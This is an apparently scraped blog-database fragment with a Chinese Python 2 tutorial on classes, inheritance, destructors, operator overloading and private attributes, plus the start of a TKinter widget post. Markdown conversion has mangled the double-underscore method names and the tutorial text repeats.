UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>print “Employee.<strong>doc</strong>:”, Employee.<strong>doc</strong><br>print “Employee.<strong>name</strong>:”, Employee.<strong>name</strong><br>print “Employee.<strong>module</strong>:”, Employee.<strong>module</strong><br>print “Employee.<strong>bases</strong>:”, Employee.<strong>bases</strong><br>print “Employee.<strong>dict</strong>:”, Employee.<strong>dict</strong><br>执行以上代码输出结果如下：<br>Employee.<strong>doc</strong>: 所有员工的基类<br>Employee.<strong>name</strong>: Employee<br>Employee.<strong>module</strong>: <strong>main</strong><br>Employee.<strong>bases</strong>: ()<br>Employee.<strong>dict</strong>: {‘<strong>module</strong>‘: ‘<strong>main</strong>‘, ‘displayCount’: <function displaycount=\"\" at=\"\" 0x10a939c80=\"\">, ‘empCount’: 0, ‘displayEmployee’: <function displayemployee=\"\" at=\"\" 0x10a93caa0=\"\">, ‘<strong>doc</strong>‘: ‘\\xe6\\x89\\x80\\xe6\\x9c\\x89\\xe5\\x91\\x98\\xe5\\xb7\\xa5\\xe7\\x9a\\x84\\xe5\\x9f\\xba\\xe7\\xb1\\xbb’, ‘<strong>init</strong>‘: <function __init__=\"\" at=\"\" 0x10a939578=\"\">}<br>python对象销毁(垃圾回收)<br>Python 使用了引用计数这一简单技术来跟踪和回收垃圾。<br>在 Python 内部记录着所有使用中的对象各有多少引用。<br>一个内部跟踪变量，称为一个引用计数器。<br>当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是”立即”的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。<br>a = 40      # 创建对象  <40><br>b = a       # 增加引用， <40> 的计数<br>c = [b]     # 增加引用.  <40> 的计数</40></40></40></function></function></function></p>\n<p>del a       # 减少引用 <40> 的计数<br>b = 100     # 减少引用 <40> 的计数<br>c[0] = -1   # 减少引用 <40> 的计数<br>垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（及未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。<br>实例<br>析构函数 <strong>del</strong> ，<strong>del</strong>在对象销毁的时候被调用，当对象不再被使用时，<strong>del</strong>方法运行：<br>实例</40></40></40></p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-3\"><a href=\"#coding-UTF-8-3\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Point:<br>   def <strong>init</strong>( self, x=0, y=0):<br>      self.x = x<br>      self.y = y<br>   def <strong>del</strong>(self):<br>      class_name = self.<strong>class</strong>.<strong>name</strong><br>      print class_name, “销毁”</p>\n<p>pt1 = Point()<br>pt2 = pt1<br>pt3 = pt1<br>print id(pt1), id(pt2), id(pt3) # 打印对象的id<br>del pt1<br>del pt2<br>del pt3<br>以上实例运行结果如下：<br>3083401324 3083401324 3083401324<br>Point 销毁<br>注意：通常你需要在单独的文件中定义一个类，<br>类的继承<br>面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。继承完全可以理解成类之间的类型和子类型关系。<br>需要注意的地方：继承语法 class 派生类名（基类名）：//… 基类名写在括号里，基本类是在类定义的时候，在元组之中指明的。<br>在python中继承中的一些特点：<br>1：在继承中基类的构造（<strong>init</strong>()方法）不会被自动调用，它需要在其派生类的构造中亲自专门调用。<br>2：在调用基类的方法时，需要加上基类的类名前缀，且需要带上self参数变量。区别于在类中调用普通函数时并不需要带上self参数<br>3：Python总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找）。<br>如果在继承元组中列了一个以上的类，那么它就被称作”多重继承” 。<br>语法：<br>派生类的声明，与他们的父类类似，继承的基类列表跟在类名之后，如下所示：<br>class SubClassName (ParentClass1[, ParentClass2, …]):<br>   ‘Optional class documentation string’<br>   class_suite<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-4\"><a href=\"#coding-UTF-8-4\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Parent:        # 定义父类<br>   parentAttr = 100<br>   def <strong>init</strong>(self):<br>      print “调用父类构造函数”</p>\n<p>   def parentMethod(self):<br>      print ‘调用父类方法’</p>\n<p>   def setAttr(self, attr):<br>      Parent.parentAttr = attr</p>\n<p>   def getAttr(self):<br>      print “父类属性 :”, Parent.parentAttr</p>\n<p>class Child(Parent): # 定义子类<br>   def <strong>init</strong>(self):<br>      print “调用子类构造方法”</p>\n<p>   def childMethod(self):<br>      print ‘调用子类方法 child method’</p>\n<p>c = Child()          # 实例化子类<br>c.childMethod()      # 调用子类的方法<br>c.parentMethod()     # 调用父类方法<br>c.setAttr(200)       # 再次调用父类的方法<br>c.getAttr()          # 再次调用父类的方法<br>以上代码执行结果如下：<br>调用子类构造方法<br>调用子类方法 child method<br>调用父类方法<br>父类属性 : 200<br>你可以继承多个类<br>class A:        # 定义类 A<br>…..</p>\n<p>class B:         # 定义类 B<br>…..</p>\n<p>class C(A, B):   # 继承类 A 和 B<br>…..<br>你可以使用issubclass()或者isinstance()方法来检测。<br>issubclass() - 布尔函数判断一个类是另一个类的子类或者子孙类，语法：issubclass(sub,sup)<br>isinstance(obj, Class) 布尔函数如果obj是Class类的实例对象或者是一个Class子类的实例对象则返回true。<br>方法重写<br>如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：<br>实例：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-5\"><a href=\"#coding-UTF-8-5\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Parent:        # 定义父类<br>   def myMethod(self):<br>      print ‘调用父类方法’</p>\n<p>class Child(Parent): # 定义子类<br>   def myMethod(self):<br>      print ‘调用子类方法’</p>\n<p>c = Child()          # 子类实例<br>c.myMethod()         # 子类调用重写方法<br>执行以上代码输出结果如下：<br>调用子类方法<br>基础重载方法<br>下表列出了一些通用的功能，你可以在自己的类重写：<br>序号    方法, 描述 &amp; 简单的调用<br>1    <strong>init</strong> ( self [,args…] )<br>构造函数<br>简单的调用方法: obj = className(args)<br>2    <strong>del</strong>( self )<br>析构方法, 删除一个对象<br>简单的调用方法 : dell obj<br>3    <strong>repr</strong>( self )<br>转化为供解释器读取的形式<br>简单的调用方法 : repr(obj)<br>4    <strong>str</strong>( self )<br>用于将值转化为适于人阅读的形式<br>简单的调用方法 : str(obj)<br>5    <strong>cmp</strong> ( self, x )<br>对象比较<br>简单的调用方法 : cmp(obj, x)<br>运算符重载<br>Python同样支持运算符重载，实例如下：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<p>class Vector:<br>   def <strong>init</strong>(self, a, b):<br>      self.a = a<br>      self.b = b</p>\n<p>   def <strong>str</strong>(self):<br>      return ‘Vector (%d, %d)’ % (self.a, self.b)</p>\n<p>   def <strong>add</strong>(self,other):<br>      return Vector(self.a + other.a, self.b + other.b)</p>\n<p>v1 = Vector(2,10)<br>v2 = Vector(5,-2)<br>print v1 + v2<br>以上代码执行结果如下所示:<br>Vector(7,8)<br>类属性与方法<br>类的私有属性<br><strong>private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.</strong>private_attrs。<br>类的方法<br>在类地内部，使用def关键字可以为类定义一个方法，与一般函数定义不同，类方法必须包含参数self,且为第一个参数<br>类的私有方法<br><strong>private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用。在类的内部调用 self.</strong>private_methods<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-6\"><a href=\"#coding-UTF-8-6\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class JustCounter:<br>    __secretCount = 0  # 私有变量<br>    publicCount = 0    # 公开变量</p>\n<pre><code>def count(self):\n    self.__secretCount += 1\n    self.publicCount += 1\n    print self.__secretCount\n</code></pre><p>counter = JustCounter()<br>counter.count()<br>counter.count()<br>print counter.publicCount<br>print counter.<strong>secretCount  # 报错，实例不能访问私有变量<br>Python 通过改变名称来包含类名:<br>1<br>2<br>2<br>Traceback (most recent call last):<br>  File “test.py”, line 17, in <module><br>    print counter.</module></strong>secretCount  # 报错，实例不能访问私有变量<br>AttributeError: JustCounter instance has no attribute ‘<strong>secretCount’<br>Python不允许实例化的类访问私有数据，但你可以使用 object._className</strong>attrName 访问属性，将如下代码替换以上代码的最后一行代码：<br>…………………….<br>print counter._JustCounter__secretCount<br>执行以上代码，执行结果如下：<br>1<br>2<br>2<br>2<br>单下划线、双下划线、头尾双下划线说明：<br><strong>foo</strong>: 定义的是特列方法，类似 <strong>init</strong>() 之类的。<br>_foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import *<br>__foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>Python从设计之初就已经是一门面向对象的语言，正因为如此，在Python中创建一个类和对象是很容易的。本章节我们将详细介绍Python的面向对象编程。<br>如果你以前没有接触过面向对象的编程语言，那你可能需要先了解一些面向对象语言的一些基本特征，在头脑里头形成一个基本的面向对象的概念，这样有助于你更容易的学习Python的面向对象编程。<br>接下来我们先来简单的了解下面向对象的一些基本特征。<br>面向对象技术简介<br>类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。<br>类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。<br>数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。<br>方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>实例变量：定义在方法中的变量，只作用于当前实例的类。<br>继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。<br>实例化：创建一个类的实例，类的具体对象。<br>方法：类中定义的函数。<br>对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。<br>创建类<br>使用class语句来创建一个新类，class之后为类的名称并以冒号结尾，如下实例:<br>class ClassName:<br>   ‘类的帮助信息’   #类文档字符串<br>   class_suite  #类体<br>类的帮助信息可以通过ClassName.<strong>doc</strong>查看。<br>class_suite 由类成员，方法，数据属性组成。<br>实例<br>以下是一个简单的Python类实例:<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8\"><a href=\"#coding-UTF-8\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>empCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。<br>第一种方法<strong>init</strong>()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法<br>self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。<br>self代表类的实例，而非类<br>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。<br>class Test:<br>    def prt(self):<br>        print(self)<br>        print(self.<strong>class</strong>)</p>\n<p>t = Test()<br>t.prt()<br>以上实例执行结果为：</p>\n<p>&lt;<strong>main</strong>.Test instance at 0x10d066878&gt;<br><strong>main</strong>.Test<br>从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。<br>self 不是 python 关键字，我们把他换成 runoob 也是可以正常执行的:<br>实例<br>class Test:<br>    def prt(runoob):<br>        print(runoob)<br>        print(runoob.<strong>class</strong>)</p>\n<p>t = Test()<br>t.prt()<br>以上实例执行结果为：</p>\n<p>&lt;<strong>main</strong>.Test instance at 0x10d066878&gt;<br><strong>main</strong>.Test<br>创建实例对象<br>实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。<br>以下使用类的名称 Employee 来实例化，并通过 <strong>init</strong> 方法接受参数。<br>“创建 Employee 类的第一个对象”<br>emp1 = Employee(“Zara”, 2000)<br>“创建 Employee 类的第二个对象”<br>emp2 = Employee(“Manni”, 5000)<br>访问属性<br>您可以使用点(.)来访问对象的属性。使用如下类的名称访问类变量:<br>emp1.displayEmployee()<br>emp2.displayEmployee()<br>print “Total Employee %d” % Employee.empCount<br>完整实例：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-1\"><a href=\"#coding-UTF-8-1\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>“创建 Employee 类的第一个对象”<br>emp1 = Employee(“Zara”, 2000)<br>“创建 Employee 类的第二个对象”<br>emp2 = Employee(“Manni”, 5000)<br>emp1.displayEmployee()<br>emp2.displayEmployee()<br>print “Total Employee %d” % Employee.empCount<br>执行以上代码输出结果如下：<br>Name :  Zara ,Salary:  2000<br>Name :  Manni ,Salary:  5000<br>Total Employee 2<br>你可以添加，删除，修改类的属性，如下所示：<br>emp1.age = 7  # 添加一个 ‘age’ 属性<br>emp1.age = 8  # 修改 ‘age’ 属性<br>del emp1.age  # 删除 ‘age’ 属性<br>你也可以使用以下函数的方式来访问属性：<br>getattr(obj, name[, default]) : 访问对象的属性。<br>hasattr(obj,name) : 检查是否存在一个属性。<br>setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。<br>delattr(obj, name) : 删除属性。<br>hasattr(emp1, ‘age’)    # 如果存在 ‘age’ 属性返回 True。<br>getattr(emp1, ‘age’)    # 返回 ‘age’ 属性的值<br>setattr(emp1, ‘age’, 8) # 添加属性 ‘age’ 值为 8<br>delattr(empl, ‘age’)    # 删除属性 ‘age’<br>Python内置类属性<br><strong>dict</strong> : 类的属性（包含一个字典，由类的数据属性组成）<br><strong>doc</strong> :类的文档字符串<br><strong>name</strong>: 类名<br><strong>module</strong>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）<br><strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）<br>Python内置类属性调用实例如下：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-2\"><a href=\"#coding-UTF-8-2\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>print “Employee.<strong>doc</strong>:”, Employee.<strong>doc</strong><br>print “Employee.<strong>name</strong>:”, Employee.<strong>name</strong><br>print “Employee.<strong>module</strong>:”, Employee.<strong>module</strong><br>print “Employee.<strong>bases</strong>:”, Employee.<strong>bases</strong><br>print “Employee.<strong>dict</strong>:”, Employee.<strong>dict</strong><br>执行以上代码输出结果如下：<br>Employee.<strong>doc</strong>: 所有员工的基类<br>Employee.<strong>name</strong>: Employee<br>Employee.<strong>module</strong>: <strong>main</strong><br>Employee.<strong>bases</strong>: ()<br>Employee.<strong>dict</strong>: {‘<strong>module</strong>‘: ‘<strong>main</strong>‘, ‘displayCount’: <function displaycount=\"\" at=\"\" 0x10a939c80=\"\">, ‘empCount’: 0, ‘displayEmployee’: <function displayemployee=\"\" at=\"\" 0x10a93caa0=\"\">, ‘<strong>doc</strong>‘: ‘\\xe6\\x89\\x80\\xe6\\x9c\\x89\\xe5\\x91\\x98\\xe5\\xb7\\xa5\\xe7\\x9a\\x84\\xe5\\x9f\\xba\\xe7\\xb1\\xbb’, ‘<strong>init</strong>‘: <function __init__=\"\" at=\"\" 0x10a939578=\"\">}<br>python对象销毁(垃圾回收)<br>Python 使用了引用计数这一简单技术来跟踪和回收垃圾。<br>在 Python 内部记录着所有使用中的对象各有多少引用。<br>一个内部跟踪变量，称为一个引用计数器。<br>当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是”立即”的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。<br>a = 40      # 创建对象  <40><br>b = a       # 增加引用， <40> 的计数<br>c = [b]     # 增加引用.  <40> 的计数</40></40></40></function></function></function></p>\n<p>del a       # 减少引用 <40> 的计数<br>b = 100     # 减少引用 <40> 的计数<br>c[0] = -1   # 减少引用 <40> 的计数<br>垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（及未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。<br>实例<br>析构函数 <strong>del</strong> ，<strong>del</strong>在对象销毁的时候被调用，当对象不再被使用时，<strong>del</strong>方法运行：<br>实例</40></40></40></p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-3\"><a href=\"#coding-UTF-8-3\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Point:<br>   def <strong>init</strong>( self, x=0, y=0):<br>      self.x = x<br>      self.y = y<br>   def <strong>del</strong>(self):<br>      class_name = self.<strong>class</strong>.<strong>name</strong><br>      print class_name, “销毁”</p>\n<p>pt1 = Point()<br>pt2 = pt1<br>pt3 = pt1<br>print id(pt1), id(pt2), id(pt3) # 打印对象的id<br>del pt1<br>del pt2<br>del pt3<br>以上实例运行结果如下：<br>3083401324 3083401324 3083401324<br>Point 销毁<br>注意：通常你需要在单独的文件中定义一个类，<br>类的继承<br>面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。继承完全可以理解成类之间的类型和子类型关系。<br>需要注意的地方：继承语法 class 派生类名（基类名）：//… 基类名写在括号里，基本类是在类定义的时候，在元组之中指明的。<br>在python中继承中的一些特点：<br>1：在继承中基类的构造（<strong>init</strong>()方法）不会被自动调用，它需要在其派生类的构造中亲自专门调用。<br>2：在调用基类的方法时，需要加上基类的类名前缀，且需要带上self参数变量。区别于在类中调用普通函数时并不需要带上self参数<br>3：Python总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找）。<br>如果在继承元组中列了一个以上的类，那么它就被称作”多重继承” 。<br>语法：<br>派生类的声明，与他们的父类类似，继承的基类列表跟在类名之后，如下所示：<br>class SubClassName (ParentClass1[, ParentClass2, …]):<br>   ‘Optional class documentation string’<br>   class_suite<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-4\"><a href=\"#coding-UTF-8-4\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Parent:        # 定义父类<br>   parentAttr = 100<br>   def <strong>init</strong>(self):<br>      print “调用父类构造函数”</p>\n<p>   def parentMethod(self):<br>      print ‘调用父类方法’</p>\n<p>   def setAttr(self, attr):<br>      Parent.parentAttr = attr</p>\n<p>   def getAttr(self):<br>      print “父类属性 :”, Parent.parentAttr</p>\n<p>class Child(Parent): # 定义子类<br>   def <strong>init</strong>(self):<br>      print “调用子类构造方法”</p>\n<p>   def childMethod(self):<br>      print ‘调用子类方法 child method’</p>\n<p>c = Child()          # 实例化子类<br>c.childMethod()      # 调用子类的方法<br>c.parentMethod()     # 调用父类方法<br>c.setAttr(200)       # 再次调用父类的方法<br>c.getAttr()          # 再次调用父类的方法<br>以上代码执行结果如下：<br>调用子类构造方法<br>调用子类方法 child method<br>调用父类方法<br>父类属性 : 200<br>你可以继承多个类<br>class A:        # 定义类 A<br>…..</p>\n<p>class B:         # 定义类 B<br>…..</p>\n<p>class C(A, B):   # 继承类 A 和 B<br>…..<br>你可以使用issubclass()或者isinstance()方法来检测。<br>issubclass() - 布尔函数判断一个类是另一个类的子类或者子孙类，语法：issubclass(sub,sup)<br>isinstance(obj, Class) 布尔函数如果obj是Class类的实例对象或者是一个Class子类的实例对象则返回true。<br>方法重写<br>如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：<br>实例：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-5\"><a href=\"#coding-UTF-8-5\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Parent:        # 定义父类<br>   def myMethod(self):<br>      print ‘调用父类方法’</p>\n<p>class Child(Parent): # 定义子类<br>   def myMethod(self):<br>      print ‘调用子类方法’</p>\n<p>c = Child()          # 子类实例<br>c.myMethod()         # 子类调用重写方法<br>执行以上代码输出结果如下：<br>调用子类方法<br>基础重载方法<br>下表列出了一些通用的功能，你可以在自己的类重写：<br>序号    方法, 描述 &amp; 简单的调用<br>1    <strong>init</strong> ( self [,args…] )<br>构造函数<br>简单的调用方法: obj = className(args)<br>2    <strong>del</strong>( self )<br>析构方法, 删除一个对象<br>简单的调用方法 : dell obj<br>3    <strong>repr</strong>( self )<br>转化为供解释器读取的形式<br>简单的调用方法 : repr(obj)<br>4    <strong>str</strong>( self )<br>用于将值转化为适于人阅读的形式<br>简单的调用方法 : str(obj)<br>5    <strong>cmp</strong> ( self, x )<br>对象比较<br>简单的调用方法 : cmp(obj, x)<br>运算符重载<br>Python同样支持运算符重载，实例如下：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<p>class Vector:<br>   def <strong>init</strong>(self, a, b):<br>      self.a = a<br>      self.b = b</p>\n<p>   def <strong>str</strong>(self):<br>      return ‘Vector (%d, %d)’ % (self.a, self.b)</p>\n<p>   def <strong>add</strong>(self,other):<br>      return Vector(self.a + other.a, self.b + other.b)</p>\n<p>v1 = Vector(2,10)<br>v2 = Vector(5,-2)<br>print v1 + v2<br>以上代码执行结果如下所示:<br>Vector(7,8)<br>类属性与方法<br>类的私有属性<br><strong>private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.</strong>private_attrs。<br>类的方法<br>在类地内部，使用def关键字可以为类定义一个方法，与一般函数定义不同，类方法必须包含参数self,且为第一个参数<br>类的私有方法<br><strong>private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用。在类的内部调用 self.</strong>private_methods<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-6\"><a href=\"#coding-UTF-8-6\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class JustCounter:<br>    __secretCount = 0  # 私有变量<br>    publicCount = 0    # 公开变量</p>\n<pre><code>def count(self):\n    self.__secretCount += 1\n    self.publicCount += 1\n    print self.__secretCount\n</code></pre><p>counter = JustCounter()<br>counter.count()<br>counter.count()<br>print counter.publicCount<br>print counter.<strong>secretCount  # 报错，实例不能访问私有变量<br>Python 通过改变名称来包含类名:<br>1<br>2<br>2<br>Traceback (most recent call last):<br>  File “test.py”, line 17, in <module><br>    print counter.</module></strong>secretCount  # 报错，实例不能访问私有变量<br>AttributeError: JustCounter instance has no attribute ‘<strong>secretCount’<br>Python不允许实例化的类访问私有数据，但你可以使用 object._className</strong>attrName 访问属性，将如下代码替换以上代码的最后一行代码：<br>…………………….<br>print counter._JustCounter__secretCount<br>执行以上代码，执行结果如下：<br>1<br>2<br>2<br>2<br>单下划线、双下划线、头尾双下划线说明：<br><strong>foo</strong>: 定义的是特列方法，类似 <strong>init</strong>() 之类的。<br>_foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import *<br>__foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。</p>\n"},{"title":"TKinter","date":"2018-07-10T13:09:19.000Z","_content":"[buju](http://www.cnblogs.com/kaituorensheng/p/3287652.html)\n\n#### 定义控件\n#### 把控件放到布局中\n#### 控件事件监听\n#### 控件信息交互\n\n\n\n\n\n控件 | 作用\n---|---\nButton\t按钮控件|在程序中显示按钮。\nCanvas\t画布控件|显示图形元素如线条或文本\nCheckbutton\t多选框控件|用于在程序中提供多项选择框\nEntry\t输入控件|用于显示简单的文本内容\nFrame\t框架控件|在屏幕上显示一个矩形区域，多用来作为容器\nLabel\t标签控件|可以显示文本和位图\nListbox\t列表框控件|在Listbox窗口小部件是用来显示一个字符串列表给用户\nMenubutton\t菜单按钮控件|由于显示菜单项。\nMenu\t菜单控件|显示菜单栏,下拉菜单和弹出菜单\nMessage\t消息控件|用来显示多行文本，与label比较类似\nRadiobutton\t单选按钮控件|显示一个单选的按钮状态\nScale\t范围控件|显示一个数值刻度，为输出限定范围的数字区间\nScrollbar\t滚动条控件|当内容超过可视化区域时使用，如列表框。.\nText\t文本控件|用于显示多行文本\nToplevel\t容器控|用来提供一个单独的对话框，和Frame比较类似\nSpinbox\t输入控件与Entry类似|但是可以指定输入范围值\nPanedWindow\tPanedWindow|是一个窗口布局管理的插件，可以包含一个或者多个子控件。\nLabelFrame\tlabelframe|是一个简单的容器控件。常用与复杂的窗口布局。\ntkMessageBox\t|用于显示你应用程序的消息框。\n\n[demo](http://blog.chinaunix.net/uid-22334392-id-3597716.html)","source":"_posts/python/TKinter.md","raw":"---\ntitle: TKinter\ndate: 2018-07-10 21:09:19\ntags: python\n---\n[buju](http://www.cnblogs.com/kaituorensheng/p/3287652.html)\n\n#### 定义控件\n#### 把控件放到布局中\n#### 控件事件监听\n#### 控件信息交互\n\n\n\n\n\n控件 | 作用\n---|---\nButton\t按钮控件|在程序中显示按钮。\nCanvas\t画布控件|显示图形元素如线条或文本\nCheckbutton\t多选框控件|用于在程序中提供多项选择框\nEntry\t输入控件|用于显示简单的文本内容\nFrame\t框架控件|在屏幕上显示一个矩形区域，多用来作为容器\nLabel\t标签控件|可以显示文本和位图\nListbox\t列表框控件|在Listbox窗口小部件是用来显示一个字符串列表给用户\nMenubutton\t菜单按钮控件|由于显示菜单项。\nMenu\t菜单控件|显示菜单栏,下拉菜单和弹出菜单\nMessage\t消息控件|用来显示多行文本，与label比较类似\nRadiobutton\t单选按钮控件|显示一个单选的按钮状态\nScale\t范围控件|显示一个数值刻度，为输出限定范围的数字区间\nScrollbar\t滚动条控件|当内容超过可视化区域时使用，如列表框。.\nText\t文本控件|用于显示多行文本\nToplevel\t容器控|用来提供一个单独的对话框，和Frame比较类似\nSpinbox\t输入控件与Entry类似|但是可以指定输入范围值\nPanedWindow\tPanedWindow|是一个窗口布局管理的插件，可以包含一个或者多个子控件。\nLabelFrame\tlabelframe|是一个简单的容器控件。常用与复杂的窗口布局。\ntkMessageBox\t|用于显示你应用程序的消息框。\n\n[demo](http://blog.chinaunix.net/uid-22334392-id-3597716.html)","slug":"python/TKinter","published":1,"updated":"2018-07-10T13:10:09.967Z","_id":"cjjedmhb9006b0gtjx3b3qjak","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.cnblogs.com/kaituorensheng/p/3287652.html\" target=\"_blank\" rel=\"noopener\">buju</a></p>\n<h4 id=\"定义控件\"><a href=\"#定义控件\" class=\"headerlink\" title=\"定义控件\"></a>定义控件</h4><h4 id=\"把控件放到布局中\"><a href=\"#把控件放到布局中\" class=\"headerlink\" title=\"把控件放到布局中\"></a>把控件放到布局中</h4><h4 id=\"控件事件监听\"><a href=\"#控件事件监听\" class=\"headerlink\" title=\"控件事件监听\"></a>控件事件监听</h4><h4 id=\"控件信息交互\"><a href=\"#控件信息交互\" class=\"headerlink\" title=\"控件信息交互\"></a>控件信息交互</h4><table>\n<thead>\n<tr>\n<th>控件</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Button    